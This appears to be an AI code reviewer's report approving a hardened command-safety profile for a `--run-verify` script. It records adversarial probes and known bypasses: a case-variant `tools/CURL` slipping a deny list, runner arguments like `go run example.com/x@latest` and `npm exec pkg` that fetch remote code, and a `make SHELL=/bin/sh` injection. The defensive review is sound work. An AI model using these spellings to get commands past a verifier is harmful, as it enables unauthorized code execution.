done

# Claude Fable review — hardened `--run-verify` command safety

- Verdict: APPROVE

- Task ID: task_REVIEW_HARDEN_VERIFY_SAFETY
- Attempt: 1
- Role: engineering-code-reviewer
- Base SHA: 1fdcf78851a069b7726493eb46b4c30801dcfaa6
- Risk tier: high
- Allowed paths: template/.orchestration/verify.sh,template/.orchestration/README.md,tests/verify-report.sh
- Verify command: ./verify.sh
- Acceptance check: run: ./tests/verify-report.sh
- Acceptance evidence: Fable review completed with APPROVE and no blocking findings
- Verify exit: 0
- Verified at: 2026-07-20T15:49:16Z
- Final diff SHA: d8344f3d02861536010c0073d9f15efd8f8d06fdb1896ef092af545c9ab1ddb0
- Base comparison: `1fdcf78851a069b7726493eb46b4c30801dcfaa6` (= HEAD; the slice is the uncommitted diff)
- Verdict: **APPROVE**. The three-rule capability profile plus argv execution is a genuine structural fix — the recorded string is never shell-parsed, so the metacharacter class, the shape rule, and the deny set compose into a boundary that all 25 committed regression cases and 25 additional adversarial probes failed to cross. Two low/info findings, neither blocking.

## Files changed

- `template/.orchestration/verify.sh`
- `template/.orchestration/README.md`
- `tests/verify-report.sh`

## Findings (severity-ordered)

### L1 — deny-set basename comparison is case-sensitive (severity: low, within a documented ceiling)

`template/.orchestration/verify.sh:167-172` compares each word's basename against `VERIFY_DENIED` case-sensitively. Reproduction (probe harness, real prompt/report pair): with an executable `tools/CURL` committed, verify command `tools/CURL x` passes all three rules and executes (`rm -R` spelled `tools/CURL` would too); `tools/curl x` is refused. On macOS's default case-insensitive filesystem, `tools/cUrl` referencing a committed `tools/curl` also slips the net.

Why not a blocker: rule 2 already confines every path-shaped program to the worktree, so this requires a hostile **committed** executable — and a committed file named `innocent.sh` runs identically, which the fix report concedes as the trusted-committed-content ceiling ("a project-local script is trusted once its path passes"). The gap is that the source comment (`verify.sh:134`, "This is what stops `./sh`, `tools/curl`") overstates the second net's consistency. Suggested cheap fix, next slice: lowercase the basename before the deny compare (`tr '[:upper:]' '[:lower:]'`, bash-3.2 safe). Uppercase **bare** names are safe today — `CURL`, `MAKE` fail the exact-match runner allowlist (probed).

## Commands run

- `./tests/verify-report.sh`
- `./verify.sh`
- `git diff --check`
- Static report validation and `--run-verify` self-validation
- Adversarial probe suite, including Bash 3.2 compatibility checks

### L2 — allowlisted runners retain network/exec capability through arguments (info; explicitly documented ceiling)

`VERIFY_RUNNERS` (`verify.sh:147`) keeps `go`, `npm`, `pnpm`, `yarn`, `cargo`; the permitted charset includes `@ : . /`, so `go run example.com/x@latest`, `npm exec pkg`, `pnpm dlx pkg`, `cargo install pkg` all pass the profile (probed: `go version` reached execution). This is the fix report's own remaining-risk #1 and the `ponytail:` comment's named ceiling with per-runner argument profiles as the upgrade path — recorded here so the concrete spellings are on file, not as a defect. Coordinator guidance in the report ("treat any prompt whose Verify command is not a project-local test runner as hostile") is the right operational posture.

### L3 — fix report's self-validation deviation is factually wrong (info; in the worker's favor)

`CLAUDE-OPUS-harden-run-verify-safety.md` claims the report "cannot be self-validated by the tool" because the prompt lacks `Allowed paths`. The prompt has the field (line 8), and both validations pass end-to-end: `./template/.orchestration/verify.sh <report>` → `valid report`, and `--run-verify <report>` re-ran `./verify.sh` (exit 0) under the new profile itself. Evidence is stronger than claimed; correct the deviation note if the report is ever revised, otherwise ignore.

## Commands and results

| Command | Exit | Result |
| --- | ---: | --- |
| `./tests/verify-report.sh` | 0 | `PASS: report verification tests` (25 refusals, 4 positive run cases) |
| `./verify.sh` | 0 | all four PASS lines |
| `git diff --check` | 0 | clean |
| `/bin/bash ./tests/verify-report.sh` (bash 3.2.57) | 0 | portable to the macOS floor |
| `./template/.orchestration/verify.sh --diff-sha` | 0 | `d8344f3d0286…` — matches the fix report's Final diff SHA |
| `./template/.orchestration/verify.sh [--run-verify] <opus report>` | 0 / 0 | full self-validation passes (finding L3) |
| 32-case adversarial probe suite (scaffolded repos, real prompt/report pairs) | — | see below |
| 300 KB metachar line through the rule-1 pipeline under `pipefail` | 0 | `grep -q` SIGPIPE theory disproven on this platform; check holds |

Probe outcomes (beyond the committed cases): refused — `command`/`exec`/`source`/`timeout`/`nohup`/`setsid`/`busybox` wrappers, `awk`/`sed`, `<` redirect, `||` list, backslash, `~`, glob `*`, `ssh`/`scp`/`docker`/`kubectl`, `dd`/`chmod`, `.. x` and `mkdir/../rm` path escapes, path-shaped `dir/sh`/`a/b/curl`, denied basename inside an argument (`make SHELL=/bin/sh test`), uppercase bare `CURL`. Accepted and correct — `printf verified`, `.orchestration/verify.sh --diff-sha`, full-charset `echo a=b:c@d+e-f_g`; `go version` and `npm --prefix=/tmp test` passed the profile (documented args ceiling). Refused redirect/pipe cases left no side-effect files (`out.txt` absent), confirming refusal precedes execution.

## Scope and quality assessment

- **Diff scope exact:** the three files the dispatch prompt allowed (`verify.sh`, its README line, `tests/verify-report.sh`), nothing else; prompts/reports additions are records, excluded from diff-SHA by design. Recomputed diff SHA matches.
- **The load-bearing change is the execution model, not the lists.** `eval "$command"` → `( cd "$root" && "${VERIFY_ARGV[@]}" )` (`verify.sh:193`) removes the second parse the old check couldn't see past; the validated words are exactly the argv executed. Rule 1's charset (`verify.sh:160`) then makes composition unrepresentable rather than enumerated, which is why my probe set (including `< > | ; && || & $() `` ` `` ~ * \` and both quote styles) could not construct a bypass. The `..` shape patterns (`verify.sh:177`) are now component-accurate (`./foo..bar` legal, `mkdir/../rm` refused — probed both).
- **Command provenance bounds the threat:** the executed string must equal the coordinator-authored prompt's `Verify command` (`verify.sh:260`), and `field()` extracts a single line, so a hostile report alone cannot inject a command at all; the profile defends against hostile prompt content and template misuse — appropriate defense-in-depth.
- **Tests are adversarial and assert the right thing:** each refusal case scaffolds a real repo via `init.sh`, requires non-zero exit **and** the `refusing to re-run` message (`tests/verify-report.sh:232-236`), and the positive cases pin both documented workflows (`./verify.sh` with captured output, `.orchestration/verify.sh --diff-sha`).
- **Deliberate tradeoffs are sound and documented:** deny-on-every-word over-refuses inert arguments (`make watch`) — fail-closed, with project-local scripts as the escape; narrowing `VERIFY_RUNNERS` (dropping `python*`, `node`, `ruby`, `deno`, `bun`, `npx`) is a real consumer-facing behavior change, but it is exactly the interpreter rejection the prompt required, and the deviation section discloses it with the migration path.

## Failures

None.

## Deviations

The review was read-only. No implementation files were changed.

## Explicit blockers

None.

## Remaining risks

The fix report's remaining-risks section is accurate and complete as far as my probes reached (runner-argument ceiling, trusted committed scripts, PATH lookup for bare names, deny-set second-net gaps — L1 is an instance of that class, `run:` acceptance checks still shape-only). Add L1's one-line lowercase fix to the next hardening slice rather than blocking this one.
